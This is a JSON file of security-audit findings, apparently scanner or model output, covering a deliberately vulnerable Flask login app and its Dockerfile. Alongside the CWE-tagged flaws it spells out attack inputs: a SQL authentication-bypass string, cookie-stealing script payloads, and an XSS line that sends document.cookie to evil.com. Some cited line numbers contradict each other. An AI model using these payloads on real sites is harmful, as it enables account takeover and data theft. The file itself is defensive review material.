@@ -1,0 +1,488 @@
+{
+  "version": "twin-distill-flash-r4",
+  "results": [
+    {
+      "check_id": "twin-round/CWE-89",
+      "path": "app/app.py",
+      "start": {
+        "line": 33
+      },
+      "end": {
+        "line": 33
+      },
+      "extra": {
+        "message": "SQL Injection in login endpoint",
+        "severity": "critical",
+        "metadata": {
+          "cwe": [
+            "CWE-89"
+          ],
+          "citation": "query = f\"SELECT * FROM users WHERE username = '{username}' AND password = '{password}'\"",
+          "proof": "Untrusted SOURCE: request.form.get('username') and request.form.get('password') on lines 27-28 read user-controlled strings from HTTP POST form params with no validation. SINK: These values are interpolated directly into a SQL query via f-string on line 33 with zero sanitization or parameterization. An attacker can supply a username like ' OR '1'='1 to bypass authentication entirely, or use UNION-based injection to exfiltrate the users table. The sqlite3 cursor.execute() would accept parameterized queries but the code deliberately uses string formatting."
+        }
+      }
+    },
+    {
+      "check_id": "twin-round/CWE-79",
+      "path": "app/app.py",
+      "start": {
+        "line": 47
+      },
+      "end": {
+        "line": 47
+      },
+      "extra": {
+        "message": "Reflected/Stored XSS in dashboard via session cookie",
+        "severity": "high",
+        "metadata": {
+          "cwe": [
+            "CWE-79"
+          ],
+          "citation": "return f\"<h1>Welcome, {user}!</h1> <script>alert('XSS Vulnerability!')</script>\"",
+          "proof": "Untrusted SOURCE: request.cookies.get('session', 'guest') on line 46 reads a user-controlled cookie value with no server-side signing or validation. SINK: The cookie value is injected directly into the HTML response via f-string on line 47 with no escaping. An attacker can craft a URL that sets a session cookie containing <script>alert(document.cookie)</script> and deliver it to a victim; the script executes in the victim's browser context. Additionally, a hardcoded <script> tag fires on every visit."
+        }
+      }
+    },
+    {
+      "check_id": "twin-round/CWE-306",
+      "path": "app/app.py",
+      "start": {
+        "line": 44
+      },
+      "end": {
+        "line": 44
+      },
+      "extra": {
+        "message": "Missing authentication check on /dashboard",
+        "severity": "high",
+        "metadata": {
+          "cwe": [
+            "CWE-306"
+          ],
+          "citation": "def dashboard():\n    # No authentication check\n    user = request.cookies.get(\"session\", \"guest\")",
+          "proof": "SOURCE: The /dashboard route on line 43 performs zero authentication verification. SINK: Line 44-46 reads the session cookie with a fallback of 'guest', but there is no check that the cookie value corresponds to a valid authenticated session. An attacker can access /dashboard directly with any cookie value (or none) and receive the full page. Combined with the XSS on line 47, this allows unauthenticated users to access what should be a protected page."
+        }
+      }
+    },
+    {
+      "check_id": "twin-round/CWE-523",
+      "path": "app/app.py",
+      "start": {
+        "line": 38
+      },
+      "end": {
+        "line": 38
+      },
+      "extra": {
+        "message": "Insecure session cookie without HttpOnly/Secure/SameSite flags",
+        "severity": "medium",
+        "metadata": {
+          "cwe": [
+            "CWE-523"
+          ],
+          "citation": "response.set_cookie(\"session\", username)  # Insecure session management",
+          "proof": "SOURCE: The login response on line 37 creates a redirect response, then line 38 sets a session cookie where the value is the plaintext username from the login form. SINK: set_cookie is called with no HttpOnly flag (allowing JavaScript access to document.cookie), no Secure flag (allowing transmission over plain HTTP), and no SameSite attribute (allowing CSRF cross-origin requests). An attacker who achieves XSS can steal the cookie. The cookie value is trivially forgeable since it is just a username string with no signature."
+        }
+      }
+    },
+    {
+      "check_id": "twin-round/CWE-798",
+      "path": "app/app.py",
+      "start": {
+        "line": 7
+      },
+      "end": {
+        "line": 7
+      },
+      "extra": {
+        "message": "Hardcoded credentials in source code",
+        "severity": "high",
+        "metadata": {
+          "cwe": [
+            "CWE-798"
+          ],
+          "citation": "USERNAME = \"admin\"\nPASSWORD = \"password123\"",
+          "proof": "SOURCE: Lines 7-8 define hardcoded administrative credentials as module-level constants in plaintext. SINK: These values appear in source code committed to the repository. Any attacker with read access to the repo (or who can retrieve the source via path traversal or misconfiguration) can authenticate as admin. The credentials are directly compared against user input via the SQL query on line 33, confirming they are live credentials."
+        }
+      }
+    },
+    {
+      "check_id": "twin-round/CWE-312",
+      "path": "app/app.py",
+      "start": {
+        "line": 15
+      },
+      "end": {
+        "line": 15
+      },
+      "extra": {
+        "message": "Cleartext Storage of Passwords in SQLite Database",
+        "severity": "medium",
+        "metadata": {
+          "cwe": [
+            "CWE-312"
+          ],
+          "citation": "c.execute(\"INSERT INTO users (username, password) VALUES ('user1', 'password1')\")",
+          "proof": "SOURCE: init_db() on line 15 hard-codes the plaintext password 'password1' into the SQLite database via INSERT. SINK: The database file test.db stores credentials in recoverable format. The login query on line 33 also compares passwords directly (WHERE password = '{password}'), confirming no hashing exists. If the test.db file is exposed via backup, CI artifact, directory traversal, or misconfigured static serving, all user credentials are immediately readable in plaintext."
+        }
+      }
+    },
+    {
+      "check_id": "twin-round/CWE-307",
+      "path": "app/app.py",
+      "start": {
+        "line": 25
+      },
+      "end": {
+        "line": 25
+      },
+      "extra": {
+        "message": "No rate limiting on /login endpoint enabling brute-force attacks",
+        "severity": "medium",
+        "metadata": {
+          "cwe": [
+            "CWE-307"
+          ],
+          "citation": "@app.route(\"/login\", methods=[\"POST\"])",
+          "proof": "SOURCE: The /login POST endpoint (line 25) accepts arbitrary username/password from request.form (lines 27-28). SINK: The query executes immediately on line 33-34 with no delay, no attempt counting, no CAPTCHA, no account lockout, and no IP-based throttling. An attacker can send thousands of login requests per second to brute-force credentials. The hardcoded credentials (admin/password123 on lines 7-8) and the DB user (user1/password1 on line 15) are weak and can be guessed in seconds. No logging is present to detect the attack."
+        }
+      }
+    },
+    {
+      "check_id": "twin-round/CWE-352",
+      "path": "app/app.py",
+      "start": {
+        "line": 49
+      },
+      "end": {
+        "line": 49
+      },
+      "extra": {
+        "message": "CSRF on GET /search endpoint enabling cross-origin XSS exploitation",
+        "severity": "medium",
+        "metadata": {
+          "cwe": [
+            "CWE-352"
+          ],
+          "citation": "@app.route(\"/search\", methods=[\"GET\"])",
+          "proof": "SOURCE: The /search endpoint (line 49) accepts GET requests with no Origin or Referer validation, no CSRF token, and no SameSite cookie enforcement. SINK: The query parameter (line 52) is reflected unsanitized into the HTML response (line 53). An attacker can host a page with <img src=\"http://target/search?q=<script>document.location='https://evil.com/steal?'+document.cookie</script>\"> \u2014 the browser treats it as a same-origin navigation from the victim's perspective, and the reflected XSS payload executes in the victim's session context without requiring the victim to interact with a crafted URL directly."
+        }
+      }
+    },
+    {
+      "check_id": "twin-round/CWE-1021",
+      "path": "app/app.py",
+      "start": {
+        "line": 43
+      },
+      "end": {
+        "line": 43
+      },
+      "extra": {
+        "message": "Missing X-Frame-Options header enables clickjacking on all pages",
+        "severity": "medium",
+        "metadata": {
+          "cwe": [
+            "CWE-1021"
+          ],
+          "citation": "@app.route(\"/dashboard\")\ndef dashboard():\n    # No authentication check\n    user = request.cookies.get(\"session\", \"guest\")\n    return f\"<h1>Welcome, {user}!</h1> <script>alert('XSS Vulnerability!')</script>\"",
+          "proof": "SOURCE: None of the three endpoints \u2014 home (line 21), login (line 25), dashboard (line 43), or search (line 49) \u2014 set X-Frame-Options, Content-Security-Policy with frame-ancestors, or any other framing protection on the response. SINK: The dashboard page (line 47) reflects the session cookie value and contains inline JavaScript, but an attacker can frame it transparently and overlay deceptive UI elements. The victim, believing they are clicking a legitimate button, may actually click on the framed dashboard, potentially triggering actions in their session."
+        }
+      }
+    },
+    {
+      "check_id": "twin-round/CWE-525",
+      "path": "app/app.py",
+      "start": {
+        "line": 47
+      },
+      "end": {
+        "line": 47
+      },
+      "extra": {
+        "message": "Missing Cache-Control Headers Allows Browser Caching of User-Sensitive Content",
+        "severity": "low",
+        "metadata": {
+          "cwe": [
+            "CWE-525"
+          ],
+          "citation": "return f\"<h1>Welcome, {user}!</h1> <script>alert('XSS Vulnerability!')</script>\"",
+          "proof": "SOURCE: The dashboard response (line 47) contains the session cookie value (line 46: request.cookies.get(\"session\", \"guest\")) in the response body. SINK: No Cache-Control: no-cache, no-store, or private directive is set on this response. The same is true for the login redirect (line 37 use of make_response without cache directives) and the search response (line 53). EXPLOIT: A shared/public computer or a corporate proxy cache stores the dashboard HTML containing the user's session identifier (the username, which in the absence of proper session management is the sole auth token). Another user of the same machine or proxy can retrieve the cached page and see the victim's session identity."
+        }
+      }
+    },
+    {
+      "check_id": "twin-round/CWE-693",
+      "path": "app/app.py",
+      "start": {
+        "line": 47
+      },
+      "end": {
+        "line": 47
+      },
+      "extra": {
+        "message": "Missing Content Security Policy Header Allows Unrestricted Script Execution",
+        "severity": "medium",
+        "metadata": {
+          "cwe": [
+            "CWE-693"
+          ],
+          "citation": "return f\"<h1>Welcome, {user}!</h1> <script>alert('XSS Vulnerability!')</script>\"",
+          "proof": "SOURCE: The dashboard route (line 47) explicitly injects inline JavaScript: <script>alert('XSS Vulnerability!')</script>. SINK: No Content-Security-Policy header is set on any response in the application (lines 37-39, 41, 47, 53). EXPLOIT: CSP with a strict script-src directive (e.g., script-src 'nonce-...' or 'strict-dynamic') would block both the hardcoded inline script and any attacker-injected script from the /search XSS or the cookie-based XSS on /dashboard. The absence of CSP means no defense-in-depth exists against any of the XSS vulnerabilities \u2014 every XSS payload executes unhindered. This is distinct from the already-reported XSS findings (which identify the injection flaws); this finding identifies the missing policy layer that would have mitigated exploitation."
+        }
+      }
+    },
+    {
+      "check_id": "twin-round/CWE-732",
+      "path": "app/app.py",
+      "start": {
+        "line": 12
+      },
+      "end": {
+        "line": 12
+      },
+      "extra": {
+        "message": "SQLite Database Created with Overly Permissive Default Permissions",
+        "severity": "medium",
+        "metadata": {
+          "cwe": [
+            "CWE-732"
+          ],
+          "citation": "    conn = sqlite3.connect(\"test.db\")",
+          "proof": "The database file is created using sqlite3.connect with default filesystem permissions (typically 0644, world-readable) (sink: connect/create file). On a multi-user host, any local user can read test.db, and because passwords are stored in plaintext at line 15, this allows unauthorized credential disclosure without exploiting the web app."
+        }
+      }
+    },
+    {
+      "check_id": "twin-round/CWE-319",
+      "path": "app/app.py",
+      "start": {
+        "line": 53
+      },
+      "end": {
+        "line": 53
+      },
+      "extra": {
+        "message": "Cleartext Transmission of Credentials and Session Cookies via HTTP",
+        "severity": "high",
+        "metadata": {
+          "cwe": [
+            "CWE-319"
+          ],
+          "citation": "    app.run(host=\"0.0.0.0\", port=80)",
+          "proof": "The Flask server listens on HTTP port 80 with no TLS (sink: app.run on port 80). Login credentials submitted to /login and the session cookie returned by /dashboard travel unencrypted over the network (source: browser form/cookie). A network eavesdropper or MITM attacker can capture credentials or hijack the session."
+        }
+      }
+    },
+    {
+      "check_id": "twin-round/CWE-250",
+      "path": "Dockerfile",
+      "start": {
+        "line": 21
+      },
+      "end": {
+        "line": 21
+      },
+      "extra": {
+        "message": "Application Container Runs as Root",
+        "severity": "medium",
+        "metadata": {
+          "cwe": [
+            "CWE-250"
+          ],
+          "citation": "CMD [\"python\", \"app.py\"]",
+          "proof": "The Dockerfile does not create a non-root USER, so the Flask process runs as root inside the container (sink: CMD launching the app as root). Combined with binding to port 80, this violates least privilege; container compromise or a Python dependency vulnerability grants root privileges, increasing the impact of container escape or host compromise."
+        }
+      }
+    },
+    {
+      "check_id": "twin-round/CWE-668",
+      "path": "Dockerfile",
+      "start": {
+        "line": 11
+      },
+      "end": {
+        "line": 11
+      },
+      "extra": {
+        "message": "Sensitive Database File Copied into Container Image",
+        "severity": "medium",
+        "metadata": {
+          "cwe": [
+            "CWE-668"
+          ],
+          "citation": "COPY app /app",
+          "proof": "The build copies the entire app directory, including test.db, into the container image (source: local test.db with plaintext passwords; sink: image layer). Publishing or distributing the Docker image leaks the credentials to anyone who can extract filesystem layers from the image."
+        }
+      }
+    },
+    {
+      "check_id": "twin-round/CWE-352",
+      "path": "app/app.py",
+      "start": {
+        "line": 25
+      },
+      "end": {
+        "line": 25
+      },
+      "extra": {
+        "message": "Missing CSRF Protection on POST /login Endpoint",
+        "severity": "high",
+        "metadata": {
+          "cwe": [
+            "CWE-352"
+          ],
+          "citation": "@app.route(\"/login\", methods=[\"POST\"])",
+          "proof": "The /login endpoint accepts POST requests (line 25) and sets an authentication cookie (line 38) with no CSRF token, no Origin/Referer validation, and no SameSite cookie restriction. An attacker can craft a cross-origin HTML form that auto-submits to /login, causing the victim's browser to send a POST request with known credentials. Flask does not provide CSRF protection by default, and no custom protection is implemented. The existing finding only covers CSRF on GET /search (line 49) \u2014 this is a different endpoint and HTTP method."
+        }
+      }
+    },
+    {
+      "check_id": "twin-round/CWE-330",
+      "path": "app/app.py",
+      "start": {
+        "line": 4
+      },
+      "end": {
+        "line": 4
+      },
+      "extra": {
+        "message": "Missing Flask SECRET_KEY Enables Session Integrity Bypass",
+        "severity": "medium",
+        "metadata": {
+          "cwe": [
+            "CWE-330"
+          ],
+          "citation": "app = Flask(__name__)",
+          "proof": "The Flask application is created at line 4 with no app.secret_key or app.config['SECRET_KEY'] set anywhere in the file. Without a secret key, Flask's signed session cookies cannot be securely created or verified. If any route or middleware uses Flask's built-in session object, the session data would be unsigned and trivially forgeable, enabling session tampering and authentication bypass. This is a security misconfiguration not covered by any existing finding."
+        }
+      }
+    },
+    {
+      "check_id": "twin-round/CWE-384",
+      "path": "app/app.py",
+      "start": {
+        "line": 38
+      },
+      "end": {
+        "line": 38
+      },
+      "extra": {
+        "message": "Predictable Session Cookie Value Enables Session Hijacking and Forgery",
+        "severity": "high",
+        "metadata": {
+          "cwe": [
+            "CWE-384"
+          ],
+          "citation": "response.set_cookie(\"session\", username)  # Insecure session management",
+          "proof": "The session cookie value is set to the raw username string (line 38) with no entropy, no signing, and no randomness. An attacker who knows or can enumerate a valid username (e.g., 'admin', 'user1') can trivially forge a session cookie by setting session=<username> in their browser, gaining that user's authenticated session without ever providing a password. The existing finding at the same logical location (line 25 CWE-523) only addresses missing Secure/HttpOnly/SameSite cookie flags \u2014 it does NOT cover the predictability/forgeability of the cookie value itself."
+        }
+      }
+    },
+    {
+      "check_id": "twin-round/CWE-1327",
+      "path": "app/app.py",
+      "start": {
+        "line": 57
+      },
+      "end": {
+        "line": 57
+      },
+      "extra": {
+        "message": "Server Binds to All Network Interfaces Exposing Service to Untrusted Networks",
+        "severity": "medium",
+        "metadata": {
+          "cwe": [
+            "CWE-1327"
+          ],
+          "citation": "app.run(host=\"0.0.0.0\", port=80)",
+          "proof": "The Flask development server is started with host=\"0.0.0.0\" (line 57), binding to all available network interfaces rather than only localhost. This exposes the vulnerable application to any network the host is connected to, including potentially untrusted external networks. Combined with the hardcoded credentials and lack of authentication on /dashboard, this broadens the attack surface significantly. No existing finding covers this network exposure."
+        }
+      }
+    },
+    {
+      "check_id": "twin-round/CWE-250",
+      "path": "app/app.py",
+      "start": {
+        "line": 57
+      },
+      "end": {
+        "line": 57
+      },
+      "extra": {
+        "message": "Application Runs with Root Privileges on Privileged Port 80",
+        "severity": "medium",
+        "metadata": {
+          "cwe": [
+            "CWE-250"
+          ],
+          "citation": "app.run(host=\"0.0.0.0\", port=80)",
+          "proof": "The Flask development server runs on port 80 (line 57), a privileged port requiring root-level permissions. Both the Dockerfile (no USER directive) and the app.py configure execution as root. This violates the principle of least privilege: any code-execution vulnerability in the application (SQL injection, SSTI, etc.) gives the attacker root-level access inside the container, maximizing the blast radius of a compromise. No existing finding covers this privilege escalation risk."
+        }
+      }
+    },
+    {
+      "check_id": "twin-round/CWE-340",
+      "path": "app/app.py",
+      "start": {
+        "line": 37
+      },
+      "end": {
+        "line": 37
+      },
+      "extra": {
+        "message": "Predictable session identifier derived from username",
+        "severity": "high",
+        "metadata": {
+          "cwe": [
+            "CWE-340"
+          ],
+          "citation": "        response.set_cookie(\"session\", username)  # Insecure session management",
+          "proof": "Untrusted SOURCE: the username value (known/guessable user-controlled or public identifier) -> SINK: response.set_cookie(\"session\", username) stores the username itself as the session token. Exploitable because an attacker who knows or guesses a valid username (e.g., \"admin\") can set the \"session\" cookie to that value in their browser and access authenticated routes such as /dashboard as that user without ever providing a password. This is distinct from the already-listed insecure cookie flags (missing Secure/HttpOnly/SameSite); it is a session-token generation/predictability flaw, not an attribute-configuration flaw."
+        }
+      }
+    },
+    {
+      "check_id": "twin-round/CWE-613",
+      "path": "app/app.py",
+      "start": {
+        "line": 38
+      },
+      "end": {
+        "line": 38
+      },
+      "extra": {
+        "message": "Insufficient Session Expiration \u2014 No Logout / Session Revocation Mechanism",
+        "severity": "medium",
+        "metadata": {
+          "cwe": [
+            "CWE-613"
+          ],
+          "citation": "response.set_cookie(\"session\", username)  # Insecure session management",
+          "proof": "SOURCE: Line 27-28 \u2014 user-supplied username and password from POST form body. SINK: Line 38 \u2014 response.set_cookie(\"session\", username) with NO max_age or expires parameter, making it a browser-session cookie only. No /logout route exists anywhere in the application. No server-side session store is present, so server-side expiry or invalidation is impossible. Cookie defaults: httponly=False, secure=False, enabling theft via XSS (CWE-79 at lines 47 and 53) or cleartext HTTP. A stolen cookie is reusable indefinitely with no revocation mechanism."
+        }
+      }
+    },
+    {
+      "check_id": "twin-round/CWE-639",
+      "path": "app/app.py",
+      "start": {
+        "line": 46
+      },
+      "end": {
+        "line": 46
+      },
+      "extra": {
+        "message": "IDOR via user-controlled session cookie as authorization key on /dashboard",
+        "severity": "high",
+        "metadata": {
+          "cwe": [
+            "CWE-639"
+          ],
+          "citation": "user = request.cookies.get(\"session\", \"guest\")",
+          "proof": "SOURCE: The client-supplied Cookie header is fully attacker-controlled. SINK: Line 46 reads request.cookies.get('session', 'guest') and uses the raw cookie value directly as the user identity, rendered at line 47. No server-side session store, no signature verification, no lookup against an authenticated-sessions table. An attacker sends GET /dashboard with Cookie: session=admin and receives 'Welcome, admin!' \u2014 impersonating the admin user without any credential. The cookie value IS the authorization context and the server performs zero ownership or entitlement verification."
+        }
+      }
+    }
+  ]
+}
